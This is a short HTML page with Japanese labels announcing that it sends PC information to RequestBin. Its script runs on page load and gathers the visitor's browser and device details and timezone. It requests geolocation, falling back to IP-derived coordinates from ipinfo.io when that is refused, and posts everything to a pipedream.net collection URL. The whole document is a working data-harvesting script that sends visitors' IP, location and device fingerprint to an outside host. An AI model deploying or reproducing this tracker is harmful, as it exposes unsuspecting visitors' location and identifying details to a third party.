<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>PC情報をRequestBinに送信</title>
</head>
<body>
  <h1>PC情報をRequestBinに送信中...</h1>
  <script>
    document.addEventListener('DOMContentLoaded', function() {
      function collectPCInfo() {
        const pcInfo = {
          userAgent: navigator.userAgent,
          language: navigator.language,
          platform: navigator.platform,
          cookieEnabled: navigator.cookieEnabled,
          screenWidth: screen.width,
          screenHeight: screen.height,
          windowInnerWidth: window.innerWidth,
          windowInnerHeight: window.innerHeight,
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
          location: {}
        };

        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(function(position) {
            pcInfo.location.latitude = position.coords.latitude;
            pcInfo.location.longitude = position.coords.longitude;
            sendData(pcInfo);
          }, function() {
            sendDataWithIpInfo(pcInfo);
          });
        } else {
          sendDataWithIpInfo(pcInfo);
        }
      }

      async function sendData(pcInfo) {
        try {
          const response = await fetch('https://ipinfo.io/json');
          const ipData = await response.json();
          pcInfo.ip = ipData;
          await fetch('https://enikio9fskusg.x.pipedream.net/', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(pcInfo)
          });
          console.log('データが送信されました:', pcInfo);
        } catch (error) {
          console.error('データ送信中にエラーが発生しました:', error);
        }
      }

      async function sendDataWithIpInfo(pcInfo) {
        try {
          const response = await fetch('https://ipinfo.io/json');
          const ipData = await response.json();
          pcInfo.ip = ipData;
          if (!pcInfo.location.latitude && !pcInfo.location.longitude) {
            [pcInfo.location.latitude, pcInfo.location.longitude] = ipData.loc.split(',');
          }
          await fetch('https://enikio9fskusg.x.pipedream.net/', {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(pcInfo)
          });
          console.log('データが送信されました:', pcInfo);
        } catch (error) {
          console.error('データ送信中にエラーが発生しました:', error);
        }
      }

      collectPCInfo();
    });
  </script>
</body>
</html>
